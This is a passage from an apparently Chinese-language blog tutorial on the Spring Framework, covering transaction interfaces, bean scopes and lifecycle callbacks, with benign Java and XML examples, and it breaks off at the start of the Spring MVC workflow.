class="keyword">int</span> <span class="title">getIsolationLevel</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 返回超时时间</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">getTimeout</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 设置是否是只读事务</span></span><br><span class="line"><span class="comment">	 * 事务的只读属性是指，对事务性资源进行只读操作或者是读写操作。</span></span><br><span class="line"><span class="comment">	 * 所谓事务性资源就是指那些被事务管理的资源，比如数据源、 JMS 资源，以及自定义的事务性资源等等。</span></span><br><span class="line"><span class="comment">	 * 如果确定只对事务性资源进行只读操作，那么可以将事务标志为只读的，以提高事务处理的性能。</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">boolean</span> <span class="title">isReadOnly</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 返回该事务的名称</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="meta">@Nullable</span></span><br><span class="line">	<span class="function">String <span class="title">getName</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="TransactionStatus接口"><a href="#TransactionStatus接口" class="headerlink" title="TransactionStatus接口"></a>TransactionStatus接口</h2><p><code>TransactionStatus</code>接口用来记录事务的状态,该接口定义了一组方法,用来获取或判断事务的相应状态信息.</p>
<p><code>PlatformTransactionManager.getTransaction(…)</code>方法返回一个<code>TransactionStatus</code>对象。返回的<code>TransactionStatus</code>对象可能代表一个新的或已经存在的事务（如果在当前调用堆栈有一个符合条件的事务）。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">TransactionStatus</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">isNewTransaction</span><span class="params">()</span></span>; <span class="comment">// 是否是新的事务</span></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">hasSavepoint</span><span class="params">()</span></span>; <span class="comment">// 是否有恢复点</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setRollbackOnly</span><span class="params">()</span></span>;  <span class="comment">// 设置为只回滚</span></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">isRollbackOnly</span><span class="params">()</span></span>; <span class="comment">// 是否为只回滚</span></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">isCompleted</span><span class="params">()</span></span>; <span class="comment">// 是否已完成</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="5-Spring一些重要的模块"><a href="#5-Spring一些重要的模块" class="headerlink" title="5. Spring一些重要的模块"></a>5. Spring一些重要的模块</h1><ul>
<li>Spring Core：基础，Spring其他所有的功能都需要依赖于该类库，主要提供IoC依赖注入功能</li>
<li>Spring Aspects：该模块为与AspectJ的集成提供支持</li>
<li>Spring AOP：提供了面向切面的编程实现</li>
<li>Spring JDBC：Java数据库连接</li>
<li>Spring JMS：Java消息服务</li>
<li>Spring ORM：用于支持Hibernate等ORM工具</li>
<li>Spring Web：为创建Web应用程序提供支持</li>
<li>Spring Test：提供了对JUnit和TestNG测试的支持 </li>
</ul>
<h1 id="6-RestController和-Controller"><a href="#6-RestController和-Controller" class="headerlink" title="6. @RestController和@Controller"></a>6. @RestController和@Controller</h1><p><code>@Controller</code>其实是<code>@Component</code>注解的一个更加明确的注解，定义在控制层。主要作用是把普通对象实例化到Spring容器。</p>
<p><code>@Controller</code>返回一个页面，单独使用<code>@Controller</code>不加<code>@ResponseBody</code>的话一般使用在要返回一个视图的情况，这种情况属于比较传统的<code>Spring MVC</code>的应用，对应于前后端不分离的情况。</p>
<p><code>@RestController</code>返回JSON或者XML形式数据，但<code>@RestController</code>只返回对象，对象数据直接以<code>JSON</code>或<code>XML</code>形式写入 HTTP 响应(Response)中，这种情况属于 RESTful Web服务，这也是目前日常开发所接触的最常用的情况（前后端分离）。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span>`+`<span class="meta">@ResponseBody</span>`返回JSON或XML形式数据，相当于`<span class="meta">@RestController</span></span><br></pre></td></tr></table></figure>

<h1 id="7-Spring中Bean的作用域有哪些？"><a href="#7-Spring中Bean的作用域有哪些？" class="headerlink" title="7. Spring中Bean的作用域有哪些？"></a>7. Spring中Bean的作用域有哪些？</h1><ul>
<li><code>singleton</code>：唯一bean实例，Spring中的bean默认都是单例的。<br>当一个 bean 的作用域为<code>singleton</code>，那么Spring IoC容器中只会存在一个共享的 bean 实例，并且所有对 bean 的请求，只要<code>id</code>与该 bean 定义相匹配，则只会返回bean的同一实例。<code>singleton</code>是单例类型(对应于单例模式)，就是在创建起容器时就同时自动创建了一个bean的对象，不管是否使用，但可以指定Bean节点的<code>lazy-init=true</code>来延迟初始化bean，这时候，只有在第一次获取bean时才会初始化bean，即第一次请求该bean时才初始化。每次获取到的对象都是同一个对象。</li>
<li><code>prototype</code>：每次请求都会创建一个新的bean的实例<br>当一个bean的作用域为<code>prototype</code>，表示一个 bean 定义对应多个对象实例。<code>prototype</code>作用域的 bean 会导致在每次对该 bean 请求（<strong>将其注入到另一个 bean 中，或者以程序的方式调用容器的<code>getBean()</code>方法</strong>）时都会创建一个新的 bean 实例。<code>prototype</code>是原型类型，它在创建容器的时候并没有实例化，而是当获取bean的时候才会去创建一个对象，而且每次获取到的对象都不是同一个对象。根据经验，<strong>对有状态的 bean 应该使用<code>prototype</code>作用域，而对无状态的 bean 则应该使用<code>singleton</code>作用域。</strong></li>
<li><code>request</code>：每一次HTTP请求都会产生一个新的bean，该bean仅在当前HTTP request内有效</li>
<li><code>session</code>：每一次HTTP请求都会产生一个新的bean，该bean仅在当前HTTP session内有效<br>可以根据需要放心的更改所创建实例的内部状态，而别的 HTTP session 中根据<code>userPreferences</code>创建的实例，将不会看到这些特定于某个 HTTP session 的状态变化。当HTTP session最终被废弃的时候，在该HTTP session作用域内的bean也会被废弃掉。</li>
<li><code>global-session</code>：全局session作用域，仅仅在基于<code>portlet</code>的Web应用才有意义，在Spring5已经取消了。Portlet 是能够生成语义代码(例如：HTML)片段的小型Java Web插件。它们基于portlet容器，可以像 servlet 一样处理HTTP请求。但是，与 servlet 不同，每个 portlet 都有不同的会话</li>
</ul>
<p>默认情况下，bean都是单例的，无论是否去主动获取或注入bean对象，Spring上下文一加载就会创建bean对象，无论注入多少次，拿到的都是同一个对象。可以通过在xml文件<code>bean</code>元素中添加<code>scope</code>属性或者使用<code>@scope</code>注解。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;notepad&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.xm.demo.NotePad&quot;</span> <span class="attr">scope</span>=<span class="string">&quot;prototype&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">@Scope(“prototype”)</span><br><span class="line"></span><br><span class="line">@Scope(scopeName = “prototype”)</span><br><span class="line"></span><br><span class="line">@Scope(ConfigurableBeanFactory.SCOPE_PROTOTYPE)</span><br></pre></td></tr></table></figure>

<h1 id="8-Spring中单例bean的线程安全问题？"><a href="#8-Spring中单例bean的线程安全问题？" class="headerlink" title="8. Spring中单例bean的线程安全问题？"></a>8. Spring中单例bean的线程安全问题？</h1><p>单例bean存在线程安全问题，主要是因为多个线程操作同一个对象的时候，对这个对象的非静态成员变量的写操作会存在线程安全问题。</p>
<p>常见的有两种解决方法：</p>
<ol>
<li>在Bean对象中尽量避免定义可变的成员变量</li>
<li>在类中定义一个<code>ThreadLocal</code>成员变量，将需要的可变成员保存在<code>ThreadLocal</code>中。(推荐方式)</li>
</ol>
<h1 id="9-Component和-Bean的区别是什么？"><a href="#9-Component和-Bean的区别是什么？" class="headerlink" title="9. @Component和@Bean的区别是什么？"></a>9. @Component和@Bean的区别是什么？</h1><p>两者的目的是一样的，都是注册bean到Spring容器中。主要区别为：</p>
<ol>
<li>作用对象不同：<code>@Component</code>注解用于类，表明一个类会作为组件类，并告知Spring要为这个类创建bean；而<code>@Bean</code>注解作用于方法，告诉Spring这个方法将会返回一个对象，这个对象要注册为Spring应用上下文中的<code>bean</code>。通常方法体中包含了最终产生<code>bean</code>实例的逻辑。</li>
<li><code>@Component</code>通常是通过类路径扫描来自动侦测以及自动装配到Spring容器中（可以使用<code>@ComponentScan</code>注解定义要扫描的路径从中找出标识了需要装配的类自动装配到Spring的<code>bean</code>容器中）；<code>@Bean</code>注解通常是在标有该注解的方法中定义产生这个<code>bean</code>，<code>@Bean</code>告诉了Spring这是某个类的实例，当需要用它的时候需要进行注入</li>
<li><code>@Bean</code>注解比<code>Component</code>注解的自定义更强，而且很多地方只能通过<code>@Bean</code>注解，例如当引用第三方库的类需要装配到Spring容器时，无法在已经定义好的类中增加<code>Component</code>注解，只能通过使用<code>@Bean</code>来实现。</li>
</ol>
<h1 id="10-将一个类声明为Spring的bean的注解有哪些？"><a href="#10-将一个类声明为Spring的bean的注解有哪些？" class="headerlink" title="10. 将一个类声明为Spring的bean的注解有哪些？"></a>10. 将一个类声明为Spring的bean的注解有哪些？</h1><p>一般使用<code>@Autowired</code>注解自动装配 bean，要想把类标识成可用于<code>@Autowired</code>注解自动装配的 bean 的类,采用以下注解可实现：</p>
<ul>
<li><code>@Component</code>：通用的注解，可标注任意类为 Spring 组件。如果一个Bean不知道属于哪个层，可以使用<code>@Component</code>注解标注。</li>
<li><code>@Repository</code>: 对应持久层即 Dao 层，主要用于数据库相关操作。</li>
<li><code>@Service</code>: 对应服务层，主要涉及一些复杂的逻辑，需要用到 Dao层。</li>
<li><code>@Controller</code>: 对应 Spring MVC 控制层，主要用户接受用户请求并调用<code>Service</code> 层返回数据给前端页面。 </li>
</ul>
<h1 id="11-Spring中bean的生命周期"><a href="#11-Spring中bean的生命周期" class="headerlink" title="11. Spring中bean的生命周期"></a>11. Spring中bean的生命周期</h1><h2 id="Initialization-和-destroy"><a href="#Initialization-和-destroy" class="headerlink" title="Initialization 和 destroy"></a>Initialization 和 destroy</h2><p>有时需要在Bean属性值set好之后和Bean销毁之前做一些事情，比如检查Bean中某个属性是否被正常的设置好值了。Spring框架提供了多种方法让我们可以在Spring Bean的生命周期中执行<code>initialzation</code>和<code>pre-destroy</code>方法。</p>
<h3 id="实现InitializingBean和DisposableBean接口"><a href="#实现InitializingBean和DisposableBean接口" class="headerlink" title="实现InitializingBean和DisposableBean接口"></a>实现<code>InitializingBean</code>和<code>DisposableBean</code>接口</h3><p>这两个接口都只包含一个方法，通过实现<code>InitializingBean</code>接口的<code>afterPropertiesSet()</code>方法可以在Bean属性值设置好之后做一些操作；实现<code>DisposableBean</code>接口的<code>destroy()</code>方法可以在销毁Bean之前做一些操作。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GiraffeService</span> <span class="keyword">implements</span> <span class="title">InitializingBean</span>,<span class="title">DisposableBean</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterPropertiesSet</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行InitializingBean接口的afterPropertiesSet方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行DisposableBean接口的destroy方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这种方法比较简单，但是不建议使用，因为这样会将Bean的实现和Spring框架耦合在一起。</p>
<h3 id="在bean的配置文件中指定init-method和destroy-method方法"><a href="#在bean的配置文件中指定init-method和destroy-method方法" class="headerlink" title="在bean的配置文件中指定init-method和destroy-method方法"></a>在bean的配置文件中指定<code>init-method</code>和<code>destroy-method</code>方法</h3><p>Spring允许我们在创建自己的<code>init</code>方法和<code>destroy</code>方法，只要在Bean的配置文件中指定<code>init-method</code>和<code>destroy-method</code>的值就可以在Bean初始化时和销毁之前执行一些操作。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GiraffeService</span> </span>&#123;</span><br><span class="line">    <span class="comment">//通过&lt;bean&gt;的destroy-method属性指定的销毁方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroyMethod</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行配置的destroy-method&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//通过&lt;bean&gt;的init-method属性指定的初始化方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">initMethod</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行配置的init-method&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>配置文件中的配置：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">name</span>=<span class="string">&quot;giraffeService&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.giraffe.spring.service.GiraffeService&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;initMethod&quot;</span> <span class="attr">destroy-method</span>=<span class="string">&quot;destroyMethod&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>需要注意的是自定义的<code>init-method</code>和<code>post-method</code>方法可以抛异常但是不能有参数。</p>
<p>这种方式比较推荐，因为可以自己创建方法，无需将Bean的实现直接依赖于spring的框架。</p>
<h3 id="使用-PostConstruct和-PreDestroy注解"><a href="#使用-PostConstruct和-PreDestroy注解" class="headerlink" title="使用@PostConstruct和@PreDestroy注解"></a>使用<code>@PostConstruct</code>和<code>@PreDestroy</code>注解</h3><p>除了xml配置的方式，Spring 也支持用<code>@PostConstruct</code>和<code>@PreDestroy</code>注解来指定<code>init</code>和<code>destroy</code>方法。这两个注解均在<code>javax.annotation</code>包中。为了注解可以生效，需要在配置文件中定义<code>org.springframework.context.annotation.CommonAnnotationBeanPostProcessor</code>或<code>context:annotation-config</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GiraffeService</span> </span>&#123;</span><br><span class="line">    <span class="meta">@PostConstruct</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">initPostConstruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行PostConstruct注解标注的方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PreDestroy</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">preDestroy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行preDestroy注解标注的方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>配置文件：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.context.annotation.CommonAnnotationBeanPostProcessor&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="实现-Aware接口-在Bean中使用Spring框架的一些对象"><a href="#实现-Aware接口-在Bean中使用Spring框架的一些对象" class="headerlink" title="实现*Aware接口 在Bean中使用Spring框架的一些对象"></a>实现*Aware接口 在Bean中使用Spring框架的一些对象</h2><blockquote>
<p>有些时候需要在Bean的初始化中使用Spring框架自身的一些对象来执行一些操作</p>
</blockquote>
<p>比如获取<code>ServletContext</code>的一些参数，获取<code>ApplicationContext</code>中的<code>BeanDefinition</code>的名字，获取Bean在容器中的名字等等。为了让Bean可以获取到框架自身的一些对象，Spring提供了一组名为<code>*Aware</code>的接口。</p>
<p>这些接口均继承于<code>org.springframework.beans.factory.Aware</code>标记接口，并提供一个将由 Bean 实现的<code>set*</code>方法,Spring通过基于<code>setter</code>的依赖注入方式使相应的对象可以被Bean使用。</p>
<ul>
<li><p><code>ApplicationContextAware</code>:获得<code>ApplicationContext</code>对象,可以用来获取所有Bean definition的名字。</p>
</li>
<li><p><code>BeanFactoryAware</code>:获得<code>BeanFactory</code>对象，可以用来检测Bean的作用域。</p>
</li>
<li><p><code>BeanNameAware</code>:获得Bean在配置文件中定义的名字。</p>
</li>
<li><p><code>ResourceLoaderAware</code>:获得<code>ResourceLoader</code>对象，可以获得<code>classpath</code>中某个文件。</p>
</li>
<li><p><code>ServletContextAware</code>:在一个MVC应用中可以获取<code>ServletContext</code>对象，可以读取<code>context</code>中的参数。</p>
</li>
<li><p><code>ServletConfigAware</code>：在一个MVC应用中可以获取<code>ServletConfig</code>对象，可以读取<code>config</code>中的参数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GiraffeService</span> <span class="keyword">implements</span>   <span class="title">ApplicationContextAware</span>,</span></span><br><span class="line"><span class="class">  <span class="title">ApplicationEventPublisherAware</span>, <span class="title">BeanClassLoaderAware</span>, <span class="title">BeanFactoryAware</span>,</span></span><br><span class="line"><span class="class"><span class="title">BeanNameAware</span>, <span class="title">EnvironmentAware</span>, <span class="title">ImportAware</span>, <span class="title">ResourceLoaderAware</span></span>&#123;</span><br><span class="line">     </span><br><span class="line">      <span class="meta">@Override</span>         </span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBeanClassLoader</span><span class="params">(ClassLoader classLoader)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行setBeanClassLoader,ClassLoader Name = &quot;</span> + classLoader.getClass().getName());</span><br><span class="line">      &#125;</span><br><span class="line">    </span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBeanFactory</span><span class="params">(BeanFactory beanFactory)</span> <span class="keyword">throws</span> BeansException </span>&#123;</span><br><span class="line">          System.out.println(<span class="string">&quot;执行setBeanFactory,setBeanFactory:: giraffe bean singleton=&quot;</span> +  beanFactory.isSingleton(<span class="string">&quot;giraffeService&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBeanName</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">          System.out.println(<span class="string">&quot;执行setBeanName:: Bean Name defined in context=&quot;</span></span><br><span class="line">                             + s);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setApplicationContext</span><span class="params">(ApplicationContext applicationContext)</span> <span class="keyword">throws</span> BeansException </span>&#123;</span><br><span class="line">          System.out.println(<span class="string">&quot;执行setApplicationContext:: Bean Definition Names=&quot;</span></span><br><span class="line">                             + Arrays.toString(applicationContext.getBeanDefinitionNames()));</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setApplicationEventPublisher</span><span class="params">(ApplicationEventPublisher applicationEventPublisher)</span> </span>&#123;</span><br><span class="line">          System.out.println(<span class="string">&quot;执行setApplicationEventPublisher&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setEnvironment</span><span class="params">(Environment environment)</span> </span>&#123;</span><br><span class="line">          System.out.println(<span class="string">&quot;执行setEnvironment&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setResourceLoader</span><span class="params">(ResourceLoader resourceLoader)</span> </span>&#123;</span><br><span class="line">          Resource resource = resourceLoader.getResource(<span class="string">&quot;classpath:spring-beans.xml&quot;</span>);</span><br><span class="line">          System.out.println(<span class="string">&quot;执行setResourceLoader:: Resource File Name=&quot;</span></span><br><span class="line">                             + resource.getFilename());</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setImportMetadata</span><span class="params">(AnnotationMetadata annotationMetadata)</span> </span>&#123;</span><br><span class="line">          System.out.println(<span class="string">&quot;执行setImportMetadata&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="BeanPostProcessor"><a href="#BeanPostProcessor" class="headerlink" title="BeanPostProcessor"></a>BeanPostProcessor</h2><p>上面的<code>*Aware</code>接口是针对某个实现这些接口的Bean定制初始化的过程，Spring同样可以针对容器中的<strong>所有Bean</strong>，或者某些Bean定制初始化过程，只需提供一个实现<code>BeanPostProcessor</code>接口的类即可。该接口中包含两个方法，<code>postProcessBeforeInitialization</code>和<code>postProcessAfterInitialization</code>。<code>postProcessBeforeInitialization</code>方法会在容器中的Bean初始化之前执行，<code>postProcessAfterInitialization</code>方法在容器中的Bean初始化之后执行。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">postProcessBeforeInitialization</span><span class="params">(Object bean, String beanName)</span> <span class="keyword">throws</span> BeansException </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;执行BeanPostProcessor的postProcessBeforeInitialization方法,beanName=&quot;</span> + beanName);</span><br><span class="line">    <span class="keyword">return</span> bean;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">postProcessAfterInitialization</span><span class="params">(Object bean, String beanName)</span> <span class="keyword">throws</span> BeansException </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;执行BeanPostProcessor的postProcessAfterInitialization方法,beanName=&quot;</span> + beanName);</span><br><span class="line">    <span class="keyword">return</span> bean;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要将BeanPostProcessor的Bean像其他Bean一样定义在配置文件中</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;com.giraffe.spring.service.CustomerBeanPostProcessor&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h2><ul>
<li>Bean容器找到配置文件中Spring Bean的定义</li>
<li>Bean容器利用Java Reflection API创建一个Bean实例</li>
<li>如果涉及到一些属性值利用,<code>set()</code>方法设置一些属性值</li>
<li>如果Bean实现了<code>BeanNameAware</code>接口，调用<code>setBeanName()</code>方法，传入Bean的名字</li>
<li>如果Bean实现了<code>BeanClassLoaderAware</code>接口，调用<code>setBeanClassLoader()</code>方法，传入<code>ClassLoader</code>对象的实例</li>
<li>如果Bean实现了<code>BeanFactoryAware</code>接口，调用<code>setBeanFactory</code>方法，传入<code>Factory</code>对象的实例</li>
<li>与上面类似，如果实现了其他<code>*.Aware</code>接口，就调用响应的方法</li>
<li>如果有和加载这个Bean的Spring容器相关的<code>BeanPostProcessor</code>对象，执行<code>postProcessBeforeInitialization()</code>方法</li>
<li>如果Bean实现了<code>InitializingBean</code>接口，执行<code>afterPropertiesSet()</code>方法</li>
<li>如果Bean在配置文件中的定义包含了<code>init-method</code>属性，执行指定的方法</li>
<li>如果有和加载这个Bean的Spring容器相关的<code>BeanPostProcessor</code>对象，执行<code>postProcessAfterInitialization()</code>方法。</li>
<li>当要销毁Bean的时候，如果bean实现了<code>DisposableBean</code>接口，执行<code>destroy()</code>方法</li>
<li>当要销毁Bean的时候，如果Bean在配置文件中的定义包含了<code>destroy-method</code>属性，执行指定的方法</li>
</ul>
<p><img src="https://camo.githubusercontent.com/a3d4415162d30d4659779f6db3717f9a68fd3c97/687474703a2f2f6d792d626c6f672d746f2d7573652e6f73732d636e2d6265696a696e672e616c6979756e63732e636f6d2f31382d392d31372f353439363430372e6a7067" alt="spring Bean的生命周期"></p>
<p>很多时候并不会真的去实现上面所说的那些接口，下面去掉这些接口，针对bean的单例和非单例来描述bean的生命周期：</p>
<h2 id="单例管理的对象"><a href="#单例管理的对象" class="headerlink" title="单例管理的对象"></a>单例管理的对象</h2><p>当 <code>scope=&quot;singleton&quot;</code>，即默认情况下，会在启动容器时（即实例化容器时）时实例化。但我们可以指定 Bean 节点的 <code>lazy-init=&quot;true&quot;</code> 来延迟初始化 bean，这时候，只有在第一次获取bean时才会初始化 bean，即第一次请求该bean时才初始化。如下配置：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;ServiceImpl&quot;</span> <span class="attr">class</span>=<span class="string">&quot;cn.csdn.service.ServiceImpl&quot;</span> <span class="attr">lazy-init</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果想对所有的默认单例 bean 都应用延迟初始化，可以在根节点 <code>beans</code> 设置 <code>default-lazy-init</code> 属性为true。</p>
<h2 id="非单例管理的对象"><a href="#非单例管理的对象" class="headerlink" title="非单例管理的对象"></a>非单例管理的对象</h2><p>当 <code>scope=&quot;prototype&quot;</code> 时，容器也会延迟初始化 bean，Spring 读取 xml 文件的时候，并不会立刻创建对象，而是在第一次请求该 bean 时才初始化（如调用<code>getBean</code>方法时）。在第一次请求每一个<code>prototype</code>的<code>bean</code> 时，Spring容器都会调用其构造器创建这个对象，然后调用 <code>init-method</code> 属性值中所指定的方法。<strong>对象销毁的时候，当容器关闭时，destroy 方法不会被调用</strong>。对于<code>prototype</code> 作用域的 bean，有一点非常重要，那就是 Spring 不能对一个<code>prototype bean</code> 的整个生命周期负责：容器在初始化、配置、装饰或者是装配完一个<code>prototype</code>实例后，将它交给客户端，随后就对该<code>prototype</code>实例不闻不问了。</p>
<p>不管何种作用域，容器都会调用所有对象的初始化生命周期回调方法。但对 <code>prototype</code> 而言，任何配置好的析构生命周期回调方法都将不会被调用。清除 <code>prototype</code> 作用域的对象并释放任何 <code>prototype bean</code> 所持有的昂贵资源，都是客户端代码的职责（让 Spring 容器释放被 <code>prototype</code> 作用域 bean 占用资源的一种可行方式是，通过使用 bean 的后置处理器，该处理器持有要被清除的 bean 的引用）。谈及 <code>prototype</code> 作用域的 bean 时，在某些方面可以将 Spring 容器的角色看作是 Java <code>new</code>操作的替代者，任何迟于该时间点的生命周期事宜都得交由客户端来处理。</p>
<p>Spring 容器可以管理 <code>singleton</code> 作用域下 bean 的生命周期，在此作用域下，Spring 能够精确地知道 bean 何时被创建，何时初始化完成，以及何时被销毁。而对于 <code>prototype</code> 作用域的 bean，Spring 只负责创建，当容器创建了 bean 的实例后，bean 的实例就交给了客户端的代码管理，Spring 容器将不再跟踪其生命周期，并且不会管理那些被配置成 <code>prototype</code> 作用域的 bean 的生命周期。</p>
<h1 id="12-Spring-MVC工作原理"><a href="#12-Spring-MVC工作原理" class="headerlink" title="12. Spring MVC工作原理"></a>12. Spring MVC工作原理</h1><p><img src="https://github.com/xiao-ming9/xiao-ming9.github.io/blob/master/images/SpringMVC%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B.jpg?raw=true" alt="Spring MVC工作原理"></p>
<ol>
<li>客户端（浏览器）发送的请求都会被前端控制器（中央控制器）<code>DispatcherServlet</code>捕获</li>
<li>中央控制器(<code>DispatcherServlet</code>)根据请求信息调用处理器映射器<code>HandleMapping</code>找到对应的处理器(<code>Handler</code>)返回给中央控制器<code>DispatcherServlet</code>。<code>HandlerMapping</code>接口处理请求的映射<code>HandlerMapping</code>接口的实现类：</li>
</ol>
<ul>
<li><code>SimpleUrlHandlerMapping</code>类通过配置文件把URL映射到Controller类</li>
<li><code>DefaultAnnotationHandlerMapping</code>类通过注解把URL映射到Controller类</li>
</ul>
<ol start="3">
<li>中央控制器<code>DispatcherServlet</code>根据返回的处理器<code>Handler</code>调用处理器适配器<code>HandleAdapter</code>，处理器适配器<code>HandlerAdapter</code>经过适配调用具体的<code>Controller</code>，并将得到的<code>ModelAndView</code>返回给中央控制器<code>DispatcherServlet</code>，<code>Model</code>是返回的数据对象，<code>View</code>是个逻辑上的<code>View</code>。<code>HandlerAdapter</code>接口的主要实现类是：</li>
</ol>
<ul>
<li><code>AnnotationMethodHandlerAdapter</code>：通过注解，把请求URL映射到Controller类的方法上。</li>
</ul>
<ol start="4">
